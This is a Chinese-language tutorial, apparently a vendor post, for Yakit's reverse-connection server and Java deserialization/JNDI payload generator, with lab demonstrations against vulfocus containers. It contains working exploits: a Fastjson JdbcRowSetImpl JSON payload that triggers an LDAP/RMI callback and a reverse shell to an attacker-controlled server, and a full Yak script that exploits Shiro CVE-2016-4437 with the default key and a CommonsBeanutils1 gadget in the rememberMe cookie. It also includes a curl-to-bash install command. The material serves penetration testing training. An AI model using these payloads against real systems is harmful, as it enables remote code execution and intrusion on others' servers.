# 序

反序列化、类加载、JNDI漏洞利用是Java漏洞中特别常见的几种类型，但相对来说利用过程又是较为复杂的。所以Yakit提供了两个特别好用的功能，无需Java环境，仅需一个Yakit。

下面先介绍下使用方法再演示下实战利用。

# 反连服务器

返连服务可用于手工渗透测试，既可用于漏洞检测，也可用于漏洞利用。

## 本地启动

初始页面如图(如果有配置公网反连，则会自动启用公网穿透，并自动填写Bridge信息)，反连地址默认是获取本机的第一块网卡IP

![](https://image.3001.net/images/20221014/1665738591_6349275fdacdb7c8d1a5f.png!small)![](https://image.3001.net/images/20221014/1665738608_63492770a895d419ca523.png!small)

启动成功后如图，根据需求填写蓝色提示框内的地址

![](https://image.3001.net/images/20221014/1665738698_634927ca873a9ecb1564c.png!small)

## 漏洞检测

写一段java代码测试下连接

![](https://image.3001.net/images/20221014/1665738739_634927f3631aafc921acf.png!small)

在Yakit上可以看见收到请求，token为aaa，返回内容为<empty>（代表响应内容为空）

![](https://image.3001.net/images/20221014/1665738753_63492801aaa1eb965cfc9.png!small)

## 漏洞利用

在返连页面右上角有个Payload配置，开启后可以看见左面出现类似 Yso-Java Hack 的页面，在这里可以配置payload，命令填写`open
/System/Applications/Calculator.app`，然后点生成。可以看见返连地址自动添加了token。

![](https://image.3001.net/images/20221014/1665738775_63492817166e29ef5b11f.png!small)

复制新地址，再试一下连接ldap，发现弹出计算器

![](https://image.3001.net/images/20221014/1665738791_634928279ff102946c2b1.png!small)

在 Yakit 上可以看见利用流程: 受害端发出 ldap 请求，Yakit 返回一个 reference 类，指向一个 web 地址 -> 受害端访问
web 地址，Yakit 返回一个恶意类 -> 受害端加载恶意类导致命令执行。

![](https://image.3001.net/images/20221014/1665738807_63492837885d00fde0c6f.png!small)

## 公网穿透

对于公网的目标，反连服务就需要在公网监听了，一是可以将Yak引擎公网部署，二是可以在公网搭建Bridge，这里主要讲下第二种方法。

首先需要在虚拟服务器上安装 Yak 引擎（执行`bash <(curl -sS -L ``http://oss.yaklang.io/install-latest-yak.sh``)`进行安装），执行`yak grpc --secret
yourpassword`启动Bridge，更多介绍可以看这篇文章《想拥有自己的 Yak Bridge？ DNSLog、ICMPLog、TCPLog
全部免费》。

如图输入 Bridge 地址和密码，启动（如果报错 connection refused 则表示连接 Bridge
失败，检查下密码是否正确、端口是否成功开启、服务器上是否有防火墙限制、云服务控制台上是否设置了安全策略）

![](https://image.3001.net/images/20221014/1665738832_63492850336c072e30067.png!small)

![](https://image.3001.net/images/20221014/1665738847_6349285f166597a0eeb25.png!small)

连接成功后可以看到反连地址的 IP 已经变为 Bridge 服务器的 IP 了，接下来的操作和本地启动相同。

# Yso-Java Hack

页面初始状态如图，左侧配置 payload 参数，右侧用来展示生成的 payload

![](https://image.3001.net/images/20221014/1665738882_634928826c37f345d2e01.png!small)

## 生成序列化payload

默认开启 “使用利用链”，即生成序列化 payload ，一级选项是利用链，二级选项是恶意类。鼠标放到小问号上可以看到介绍。

![](https://image.3001.net/images/20221014/1665738901_63492895af25100fd0ff8.png!small)

选择利用链和恶意类后，会出现配置表单，类名默认是随机生成的，填写所有表单信息，点击生成，就可以在右侧看到生成的 payload ，点击上方可以切换展示方式。

![](https://image.3001.net/images/20221014/1665738920_634928a8ee8761c08103e.png!small)

![](https://image.3001.net/images/20221014/1665738933_634928b52a69eea35ca65.png!small)

还可以展示生成payload的代码，还可以将代码发送到Yak Runner，师傅们写插件时如果懒得写，就可以直接在这里直接生成代码。

![](https://image.3001.net/images/20221014/1665738949_634928c5b444cafceb76b.png!small)

最新版本 payload 展示类型增加了一个 DUMP ，可以看到 payload 的数据结构，像下面这样。

![](https://image.3001.net/images/20221014/1665738968_634928d8037bbbe44be80.png!small)

## 生成恶意类

如图，关闭 “使用利用链” 就可以生成恶意类，具体操作和生成利用链类似

![](https://image.3001.net/images/20221014/1665738983_634928e75aaa582f3ef23.png!small)

可以看见关闭 “使用利用链” 时多了一个启动反连服务按钮，下面再看一下反连服务。

## 配合反连使用

在配置好恶意类后，点击启动反连，就可以使用当前恶意类直接启动反连了（如果配置了公网反连则使用此配置启动，否则使用本地启动，如果启动失败，请自行在高级配置里配置反连地址），如图

![](https://image.3001.net/images/20221014/1665738998_634928f65ad7e0d2a5b10.png!small)

# 实战测试

新功能介绍完了，下面看下实战场景吧，以 Fastjson 和 shiro 利用为例

## Fastjson测试

这里使用 vulfocus 启动一个 CNVD-2017-02833 实例，攻击流程如下

  1. 在 虚拟服务器 启动一个 yak 引擎`yak grpc --host 0.0.0.0`，Yakit 端输入服务器地址和端口（默认8087），连接

  2. 打开Yakit的端口监听器，监听一个端口，以 8086 为例

![](https://image.3001.net/images/20221014/1665739021_6349290d7cc5dd62cf621.png!small)

  3. 启动反连服务器并配置恶意类为 TCPReverseShell ，主机填 虚拟服务器的 ip ，端口填上面监听的 8086 ，点击应用

![](https://image.3001.net/images/20221014/1665739043_63492923893d2803f0e7f.png!small)

  4. 打开 webfuzzer，发送 Payload

![](https://image.3001.net/images/20221014/1665739071_6349293f04488ecbe801c.png!small)

    
    
    POST / HTTP/1.1
    Host: 目标地址
    Content-Type: application/json
    
    {
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"<这里填写 “LDAP反连地址” 或 “RMI反连地址” >",
            "autoCommit":true
        }
    }
    

如图，反连列表中可以看见成功收到 LDAP 和 HTTP 请求，说明目标成功加载了恶意类（如果只收到 LDAP 请求，没有 HTTP 请求，可能是目标未开启
com.sun.jndi.ldap.object.trustURLCodebase ）

![](https://image.3001.net/images/20221014/1665739103_6349295f221ab4aab6ba5.png!small)

端口监听器收到了目标机器的连接

![](https://image.3001.net/images/20221014/1665739124_634929743c7e770b99772.png!small)

  

## Shiro测试

使用vulfocus/shiro-CVE-2016-4437镜像搭建环境，启动Yakit

打开Yso-Java Hack，利用链选择CommonsBeanutils1，恶意类选择RuntimeExec，填写命令，生成Yak代码

![](https://image.3001.net/images/20221014/1665739144_634929889fbccbda1f812.png!small)

编写Yak脚本

    
    
    // 生成key
    base64Key=`kPH+bIxk5D2deZiIxcaaaA==`
    key,_ = codec.DecodeBase64(base64Key)
    // 生成payload
    gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("touch /tmp/111"),yso.obfuscationClassConstantPool(),yso.evilClassName("yVeqoYww"))
    if err != nil {
        println(err.Error())
        return
    }
    payload,err = yso.ToBytes(gadgetObj)
    // 加密payload
    payload = codec.PKCS5Padding(payload, 16)
    encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
    finalPayload = codec.EncodeBase64(append(key, encodePayload...))
    // 发送payload
    rsp,req,err = poc.HTTP(`GET /login HTTP/1.1
    Host: 目标
    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cache-Control: no-cache
    Cookie: rememberMe={{params(payload)}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
    
    `,poc.params({"payload":finalPayload}))
    headers, _ = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
    println(string(headers))

执行后进入容器看见/tmp目录下多了111文件，利用成功

# 总结

有些Java漏洞的利用太繁琐了，需要java环境、多种工具配合使用、还要在虚拟服务器上看回显、记各种命令…

对比之下 Yakit 真的太好用了。本次更新的两个功能基本上可以解决大部分Java漏洞利用的场景，希望师傅们多多使用，欢迎提出意见。

# 附上插件最新功能速递：

插件可以申请修改他人的插件啦~作者同意修改后，插件协作者也会增加你的署名噢~

插件仓库—下载—编辑—提交申请内容，只需几步轻松完成

![](https://image.3001.net/images/20221014/1665739191_634929b7635e632947a95.png!small)

提交修改以后，可在“日志”查看修改记录，以及作者审核结果

![](https://image.3001.net/images/20221014/1665739210_634929ca8908a3fc2773d.png!small)

为了帮助作者更好审核插件，贴心提供了插件源码的对比功能，一眼就可看出修改内容

![](https://image.3001.net/images/20221014/1665739229_634929dde0f15d0bf956b.png!small)

